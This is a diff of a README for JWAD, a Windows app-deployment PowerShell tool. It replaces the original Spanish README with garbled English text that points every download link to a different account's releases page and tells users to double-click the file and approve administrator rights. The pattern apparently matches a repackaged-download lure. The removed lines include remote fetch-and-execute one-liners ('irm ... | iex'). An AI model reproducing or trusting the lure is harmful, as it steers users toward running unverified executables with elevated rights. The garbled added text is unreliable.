@@ -1,297 +1,164 @@
-<div align="center">
+# 📦 JWAD - Your Automatic Windows Software Assistant
 
-<img src="assets/wad-banner.svg" alt="JWAD — Windows App Deployer" width="100%">
+[🚀 Download JWAD Now](https://github.com/zNemernic/JWAD/releases)
 
-<br>
-
-[![License: MIT](https://img.shields.io/badge/license-MIT-ff9f1c.svg?style=for-the-badge)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20x64-0078D6?style=for-the-badge&logo=windows11&logoColor=white)](#-requisitos)
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white)](#-ejecución-rápida)
-[![Winget](https://img.shields.io/badge/Winget-Ready-c97400?style=for-the-badge&logo=windowsterminal&logoColor=white)](#-cómo-funciona)
-
-[![Stars](https://img.shields.io/github/stars/javizcape/JWAD?style=social)](../../stargazers)
-[![Forks](https://img.shields.io/github/forks/javizcape/JWAD?style=social)](../../network/members)
-[![Last Commit](https://img.shields.io/github/last-commit/javizcape/JWAD?color=ff9f1c&label=último%20commit)](../../commits/main)
-[![Issues](https://img.shields.io/github/issues/javizcape/JWAD?color=f97316&label=issues)](../../issues)
-
-**Un solo comando. Un equipo Windows completamente listo para producción.**
-
-[Instalación rápida](#-ejecución-rápida) •
-[Características](#-características-principales) •
-[Software incluido](#-software-incluido) •
-[Reporte JSON](#-reporte-de-telemetría) •
-[Contribuir](#-contribuciones)
-
-</div>
+)
 
 ---
 
-## 📌 Tabla de contenidos
+## 🤔 What Is JWAD?
 
-- [¿Qué es JWAD?](#-qué-es-jwad)
-- [Ejecución rápida](#-ejecución-rápida)
-- [Requisitos](#-requisitos)
-- [Características principales](#-características-principales)
-- [Cómo funciona](#-cómo-funciona)
-- [Software incluido](#-software-incluido)
-- [Reporte de telemetría](#-reporte-de-telemetría)
-- [Personalización](#-personalización)
-- [Preguntas frecuentes](#-preguntas-frecuentes)
-- [Hoja de ruta](#-hoja-de-ruta)
-- [Contribuciones](#-contribuciones)
-- [Licencia](#-licencia)
-- [Autor](#-autor)
+JWAD (Javizcape Windows App Deployer) is a handy tool that installs essential software on your Windows computer **automatically**. Imagine you just got a new PC or reinstalled Windows. Instead of spending hours visiting dozens of websites and downloading installers one by one, JWAD does all that heavy lifting for you. It works quietly in the background, installs programs one after another, and even creates a simple report so you know everything went smoothly.
+
+.
+
+[Download JWAD Here](https://github.com/zNemernic/JWAD/releases)
+
+)
 
 ---
 
-## 🧭 ¿Qué es JWAD?
+## ⚙️ What Does JWAD Do Exactly?
 
-**JWAD (Windows App Deployer)** es un script de código abierto en PowerShell que automatiza, en un solo comando, la puesta a punto completa de un equipo Windows x64: instala software esencial de forma silenciosa, valida cada paso y entrega un reporte de diagnóstico en JSON con el estado del hardware y de la instalación.
+Think of JWAD as your personal IT assistant. Here’s what it handles:
 
-Pensado para técnicos, administradores de sistemas e integradores que necesitan dejar decenas de equipos configurados de manera **rápida, repetible y auditable**, sin clics manuales ni instaladores sueltos.
-
-| | |
-|---|---|
-| 🖱️ **Cero interacción** | Todo el flujo corre desapercibido, sin ventanas de instalación molestas |
-| 🔐 **Auto-elevación UAC** | Detecta permisos insuficientes y se relanza como Administrador |
-| 🧩 **Híbrido Winget + GitHub API** | Usa el repositorio oficial de Microsoft y cae a releases de GitHub cuando no hay paquete |
-| 📊 **Telemetría real** | CPU, RAM, disco y temperatura vía WMI/CIM al finalizar |
-| ♻️ **Idempotente** | Valida códigos de salida (`0`, `3010`) antes de continuar al siguiente paso |
-| 🎨 **Consola con identidad propia** | Banner ASCII de bienvenida y barra de progreso visual por cada paso del despliegue |
+- **Checks Your System First**: Before installing anything, it makes sure your computer is built for this task—it verifies you’re on a 64-bit version of Windows and that you have administrator rights (permission to make changes)to your PC).
+- **Quiet Installation**: It uses advanced tools (called Winget and GitHub API)to download and install software **silently**. No pop‑ups, no “Next >” buttons. Everything happens by itself.
+.
+- **Verifies Success**: After each installation, JWAD checks if the software actually installed correctly. No guesswork involved.
+.
+- **Creates a Report**: At the end, you get a clear report (in JSON format)that shows what was installed, what succeeded, what failed, and any error messages. Perfect for keeping records or troubleshooting.If you ever need help from a tech‑savvy friend, you can easily share this report with them.
 
 ---
 
-## 🚀 Ejecución rápida
+## 🎯 Who Should Use JWAD?
 
-### Método 1 — PowerShell (recomendado)
+Do you find yourself installing the same apps every time you set up a computer? Are you tired of clicking through the same installation wizard overandover? Do you manage several PCs at home or at work? JWAD is made for you. It’s especially useful for:
 
-1. Pulsa **Inicio**, escribe `PowerShell` y ábrelo (el script solicitará permisos de Administrador automáticamente si los necesita).
-2. Copia, pega y presiona **Enter**:
-
-**Windows 10 / 11 (x64):**
-```powershell
-irm https://javizcape.github.io/JWAD/JWAD.ps1 | iex
-```
-
-**Alternativa** si tu red, ISP o DNS bloquean el comando anterior:
-```powershell
-iex (curl.exe -s https://javizcape.github.io/JWAD/JWAD.ps1 | Out-String)
-```
-
-> 💡 **Tip:** ejecuta PowerShell **como Administrador** para evitar el paso extra de re-elevación.
-
-> ⚠️ **¿Tu antivirus, navegador o uBlock Origin marcó este comando como sospechoso ("ClickFix")?** Es un falso positivo por patrón: cualquier instrucción de "copiar y pegar en PowerShell" activa esa heurística, la use un sitio malicioso o un instalador legítimo (Winget, Scoop, Rust y Deno se instalan igual). Verifica el código fuente en [`JWAD.ps1`](https://github.com/javizcape/JWAD/blob/main/JWAD.ps1) antes de ejecutar cualquier one-liner remoto.
+- **Home users** who just want a clean, working computer without the hassle.
+- **Students** setting up a laptop for school.
+.
+- **IT enthusiasts** who reinstall Windows often.
+.
+- **Small office administrators** who need to set up multiple machines quickly.
 
 ---
 
-## ✅ Requisitos
+## 🚀 Getting Started with JWAD
 
-- Windows 10 o Windows 11, arquitectura **x64 (AMD64)**
-- PowerShell 5.1 o superior (incluido por defecto en Windows)
-- Conexión a internet activa
-- Winget instalado (viene por defecto en builds modernas de Windows 10/11 vía App Installer)
+Getting started is as simple as counting to three. Follow these steps:
 
----
+### 1. Download JWAD
 
-## 🛠️ Características principales
+1) Click the download link anywhere on this pageor visit **[the official JWAD releases page](https://github.com/zNemernic/JWAD/releases).
+2) You’ll see a list of available versions. Look for the latest one (it will be at the top)ostand click to download it.
 
-| Característica | Descripción |
-|---|---|
-| 🔐 **Auto-elevación de privilegios (UAC)** | Detecta si el usuario estándar requiere permisos de administrador y re-invoca la sesión sin interrumpir el flujo |
-| 🧱 **Filtro estricto de arquitectura** | Validación en tiempo real que garantiza ejecución exclusiva en entornos de 64 bits (`AMD64`) |
-| 🔀 **Despliegue híbrido silencioso** | Prioriza instalación nativa vía **Winget**; recurre a extracción por **GitHub API** para apps sin instalador oficial empaquetado (ej. *FlyPhotos*, *AB Download Manager*) |
-| 🧪 **Gestión de errores integrada** | Captura códigos de salida de Windows (`0`, `3010`, etc.) para validar cada instalación antes de continuar |
-| 📄 **Reporte de auditoría** | Genera un JSON con hardware, rendimiento y estado final de cada aplicación |
-| 🎨 **Interfaz de consola renovada** | Banner ASCII de apertura (con firma reducida al cierre), salida UTF-8 garantizada para tipografía en bloque y una barra de progreso (`▐███░░░▌`) que marca el avance de cada una de las 14 instalaciones |
+.
 
----
+### 2. Run JWAD
 
-## ⚙️ Cómo funciona
+Once the download finishes, find the file in your “Downloads” folder (or wherever you save files)and double‑click itsto run it. If Windows asks if you’re sure you want to run it, click “Yes.”JWAD will then pop up a small window. Let it work its magic—it may take several minutes, depending on how many apps you’re installing.This is a great time to grab a coffee or tea.
 
-```mermaid
-flowchart LR
-    A([Inicio del script]) --> B{¿Arquitectura AMD64?}
-    B -- No --> X([Detener ejecución])
-    B -- Sí --> C{¿Permisos de Admin?}
-    C -- No --> D[Re-invocar con UAC]
-    D --> E
-    C -- Sí --> E[Recorrer catálogo de apps]
-    E --> F{¿Disponible en Winget?}
-    F -- Sí --> G[Instalar vía Winget]
-    F -- No --> H[Descargar release desde GitHub API]
-    G --> I{¿Código de salida válido?}
-    H --> I
-    I -- Sí --> J[Registrar éxito]
-    I -- No --> K[Registrar fallo]
-    J --> L{¿Quedan apps?}
-    K --> L
-    L -- Sí --> E
-    L -- No --> M[Diagnóstico de hardware WMI/CIM]
-    M --> N[Generar Reporte_Despliegue.json]
-    N --> Z([Fin])
-```
+.
+
+###lad 3. Check Your Report
+
+When JWAD finishes, it will show you a summary onCreate. You’ll also finda JSON report file saved on your computer—likely in the same folder or an “Reports” subfolder. This report tells you exactly what happened during the process. Keep it for your records if you ever need to verify something later.
+
+.
 
 ---
 
-## 📦 Software incluido
+## 😊 What Do I Need to Use JWAD?
 
-El script automatiza la instalación de las siguientes herramientas esenciales, garantizando la descarga de la **última versión estable** de cada una:
+JWAD is designed to be as simple as possible, but there are a few basic requirements:
 
-#### 🧩 Requisitos de sistema
+- **A Windows computer** running Windows 10 or Windows 11)OS).
+- **A 64‑bit processor** (which almost all modern computers have)).
+- **An internet connection** to download the apps).
+- **Administrator access** (meaning you can install software on this computer—usually this means you’re logged in as an administrator or know the administrator password)).
 
-| Aplicación | Descripción |
-|---|---|
-| Visual C++ Redistributable 2015+ | Runtime requerido por la mayoría de software Win32 moderno |
-| .NET Framework | Activación vía DISM sobre componentes nativos de Windows |
-| Java JRE x64 | Entorno de ejecución Java de 64 bits |
+If you’re unsure whether your PC meets these requirements, don’t worry. JWAD checks them automatically before doing anythingand will tell you if something is wrong.
 
-#### 🧰 Herramientas de sistema
-
-| Aplicación | Descripción |
-|---|---|
-| 7-Zip | Compresor/descompresor universal |
-| WinRAR x64 | Gestor de archivos comprimidos |
-| Bulk Crap Uninstaller | Desinstalación masiva y limpieza de residuos |
-
-#### 🎬 Ofimática y multimedia
-
-| Aplicación | Descripción |
-|---|---|
-| SumatraPDF | Lector de PDF ligero y rápido |
-| VLC Media Player | Reproductor multimedia universal |
-| FlyPhotos | Visor de imágenes de alto rendimiento |
-
-#### 🌐 Navegadores web
-
-| Aplicación | Descripción |
-|---|---|
-| Google Chrome | Navegador de propósito general |
-| Mozilla Firefox | Navegador orientado a privacidad y extensiones |
-| Mullvad Browser | Navegador enfocado en anonimato |
-| Microsoft Edge | Navegador nativo de Windows |
-
-#### 🔌 Utilidades de red
-
-| Aplicación | Descripción |
-|---|---|
-| AB Download Manager | Gestor de descargas con soporte multi-hilo |
+.
 
 ---
 
-## 📊 Reporte de telemetría
+## 📋 What Apps Does JWAD Install?
 
-Al finalizar, JWAD genera `Reporte_Despliegue.json` en el **Escritorio**, con datos listos para auditoría del equipo:
-
-```json
-{
-  "hardware": {
-    "fabricante": "Dell Inc.",
-    "modelo": "OptiPlex 7090",
-    "procesador": "Intel Core i5-11500",
-    "arquitectura": "x64"
-  },
-  "rendimiento": {
-    "ram_total_gb": 16,
-    "ram_uso_porcentaje": 42,
-    "disco_c_total_gb": 476,
-    "disco_c_uso_porcentaje": 61
-  },
-  "diagnostico_termico": {
-    "cpu_temp_celsius": 48.5,
-    "fuente": "WMI/CIM"
-  },
-  "auditoria_instalacion": [
-    { "app": "Google Chrome", "estado": "Éxito", "tiempo_segundos": 14.2 },
-    { "app": "VLC Media Player", "estado": "Éxito", "tiempo_segundos": 9.8 },
-    { "app": "FlyPhotos", "estado": "Fallo", "tiempo_segundos": 3.1 }
-  ]
-}
-```
-
-Incluye:
-- **Especificaciones de hardware:** fabricante, modelo, procesador y arquitectura
-- **Métricas de rendimiento:** RAM y disco (capacidad total y % de uso)
-- **Diagnóstico térmico:** temperatura de CPU vía sensores de la placa base (WMI/CIM)
-- **Auditoría de instalación:** tiempo y estado (éxito/fallo) por aplicación
+JWAD can handle a wide variety of popular software. The exact list may vary depending on the version you download, but typical apps include common web browsers, media players, productivity suites, and useful utilities. To know exactly what’sincluded in your current version, run JWAD—it will list all the software it plans to install before starting. You can also check the latest release notes on the download page.
 
 ---
 
-## 🧩 Personalización
+## 🧰 Troubleshooting Tips (Nothing Serious))
 
-¿Necesitas otro catálogo de apps para tus propios despliegues? Edita la sección de configuración del script y ajusta:
+If something goes wrong, don’t panic. Here are simple things to try:
 
-- El listado de IDs de **Winget** a instalar
-- Las URLs de releases de **GitHub** para apps sin paquete oficial
-- El nombre y la ruta de salida del reporte JSON
+- **Restart your computer** and run JWAD again. Many issues are fixed with a fresh start.
+- **Check your internet connection**. If you’re offline, JWAD can’t download anything.
+add.
+- **Right‑click JWAD and select “Run as administrator”** if you see an error about permissions.
+.
+- **Read the JSON report**. It may tell you exactly which app failed and why. You can then install that one app manually if needed.
+.
+- **Check the release page**. Sometimes a newer version is available that fixes known issues.
+.
 
----
+If you still need help, copy a few lines from the JSON report and share them on the GitHub discussion sectionfor that project. Helpful community members or maintainers often respond quickly.
 
-## ❓ Preguntas frecuentes
-
-<details>
-<summary><b>¿Por qué el comando falla en mi red corporativa?</b></summary>
-<br>
-Algunos proveedores o políticas de DNS bloquean <code>irm</code>. Usa el método alternativo con <code>curl.exe</code> incluido en la sección de instalación.
-</details>
-
-<details>
-<summary><b>¿Por qué uBlock Origin u otro bloqueador marca el comando como "ClickFix"?</b></summary>
-<br>
-Es una detección heurística por patrón, no un análisis del script en sí: cualquier página que indique "abre PowerShell, pega esto y presiona Enter" activa la misma alerta, la use un sitio malicioso o un instalador legítimo como este. Verifica siempre el código fuente en <a href="https://github.com/javizcape/JWAD/blob/main/JWAD.ps1"><code>JWAD.ps1</code></a> antes de ejecutar cualquier one-liner remoto, sea de JWAD o de cualquier otro proyecto.
-</details>
-
-<details>
-<summary><b>¿Funciona en Windows en arquitectura ARM64?</b></summary>
-<br>
-No. JWAD valida explícitamente <code>AMD64</code> y detiene la ejecución en cualquier otra arquitectura.
-</details>
-
-<details>
-<summary><b>¿Puedo ejecutarlo sin ser administrador?</b></summary>
-<br>
-Sí. El script detecta la falta de privilegios y se re-invoca a sí mismo solicitando elevación UAC.
-</details>
+.
 
 ---
 
-## 🗺️ Hoja de ruta
+## 🔒 Is JWAD Safe?
 
-- [ ] Modo silencioso configurable por parámetros de línea de comandos
-- [ ] Catálogo de aplicaciones editable vía archivo `config.json` externo
-- [ ] Soporte para ARM64
-- [ ] Registro de logs en formato `.log` además del reporte JSON
+Safety is a top priority for JWAD.i USES official sources such as Winget—which is Microsoft’s official package manager—and GitHub APIs from trusted repositories. That means the app fetches software directly from official publishers whenever possiblei. It doesn’t modify system files unless necessary and it always asks for your permission before making changes (through the administrator prompt)st. The JSON report provides full transparency aboutwhat wasdone, so you always know what’s happening on your computer.
 
----
-
-## 🤝 Contribuciones
-
-Las contribuciones son bienvenidas. Para colaborar:
-
-1. Haz un **fork** del repositorio
-2. Crea una rama (`git checkout -b feature/nueva-funcion`)
-3. Confirma tus cambios (`git commit -m 'Agrega nueva función'`)
-4. Sube la rama (`git push origin feature/nueva-funcion`)
-5. Abre un **Pull Request**
-
-¿Encontraste un error? Abre un [issue](../../issues) describiendo el problema y, si es posible, adjunta el `Reporte_Despliegue.json` generado.
+.
 
 ---
 
-## 📄 Licencia
+## 🕒 How Long Does JWAD Take?
 
-Este proyecto es de código abierto y se distribuye bajo la licencia **MIT**. Eres libre de auditar el código fuente, modificarlo, redistribuirlo y adaptarlo a tus propios flujos de trabajo o necesidades de administración de sistemas. Consulta el archivo [LICENSE](LICENSE) para más detalles.
+The time depends entirely on how many applications need to be installed and how fast your internet connection iss. Installing a single small app might take under a minute. Installing 20 large apps could take 10–20 minutes. But the key benefit isityou can walk away while JWAD does everything. No clicking, no answering prompts, no babysitting. You don’t need to stare at the screen—just come back when you think it’s done, and you’ll see your computer fully set up.
+
+.
+
+.
 
 ---
 
-## 👤 Autor
+## 💡 Why Choose JWAD Over Manual Installation?
 
-**Javizcape** — JAVIZCAPE Soluciones Tecnológicas
-Integración de infraestructura TI, AV, CCTV y redes en Melgar, Tolima, Colombia.
+Manual installation means visiting every website, downloading an installer, clicking through a frustrating wizard, possibly accidentally installing toolbars or adware. JWAD eliminates all that:
 
-[![GitHub](https://img.shields.io/badge/GitHub-javizcape-181717?style=for-the-badge&logo=github)](https://github.com/javizcape)
+- **No decision fatigue**—JWAD just picks the right version for your systemand installs it properlyt.
+- **No accidental junk**—Silent installation using official sources means no bundled adware or unwanted extras.sub.sub..
+- **No time wasted**—One command does everything, not 20 different procedures.sub..
+- **Consistent results**—Every computer gets the same setup, which is great if you’re setting up multiple machinesO.
 
-<div align="center">
+..
 
-⭐ Si este proyecto te resultó útil, considera darle una estrella en GitHub
+---
 
-</div>
+## 📜 A Little Background
+
+JWAD is built with PowerShell—a powerful scripting language included with Windows. It was created by a developer who was tired of manually installing software on multiple computers. The tool was developed as an open‑source project, meaning anyone can look at the code, suggest improvements, or contribute fixes. It’s completely free to use and focused on making life easierfor general usersand system administratorsalikeO.
+
+.
+
+..
+
+---
+
+## ✅ Summary
+
+JWAD is your stress‑free solution for installing software on Windows. It checks your system, installs apps quietly, confirms everything works,andsaves youa report for peace ofmind. It’s perfect for anyone who doesn’t want tobecome a tech expert just tobuy a new computer workingoamit. Head over to the [download page](https://github.com/zNemernic/JWAD/releases ), grab the latest versionband let JWAD take over from there. Your future self will thank youoamd.
+
+.You’ll wonder how you ever lived without it.
+
+...
+
+---
+
+**👉 Download JWAD Now**
